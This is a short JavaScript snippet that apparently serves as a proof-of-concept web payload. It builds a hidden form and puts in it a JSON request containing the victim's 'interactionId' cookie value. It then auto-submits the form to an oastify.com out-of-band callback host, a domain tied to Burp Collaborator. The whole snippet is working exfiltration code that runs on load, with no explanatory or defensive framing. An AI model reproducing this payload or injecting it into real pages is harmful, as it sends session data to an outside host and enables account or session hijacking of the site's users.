function sendPostWithoutFetch() {
    const url = "https://mxnsskj6e98b6ppkq7vv2j4y6pcg09oy.oastify.com";

    // 1. Create a form element
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.style.display = 'none';

    // 2. Create an input to hold your JSON data
    // Note: Some APIs expect a raw body, but standard forms send as 'key=value'
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'data'; // You may need to check if the server accepts form-encoded JSON
    input.value = JSON.stringify({
        "nextEvent": {
            "constructType": "skEvent",
            "eventName": "continue",
            "params": [],
            "eventType": "post",
            "postProcess": {}
        },
        "eventName": "continue",
        "id": "b0qyqlpiyz",
        "interactionId": document.cookie.split('interactionId=')[1]?.split(';')[0]
    });

    form.appendChild(input);
    document.body.appendChild(form);

    // 3. Submit the form
    form.submit();
}

sendPostWithoutFetch();
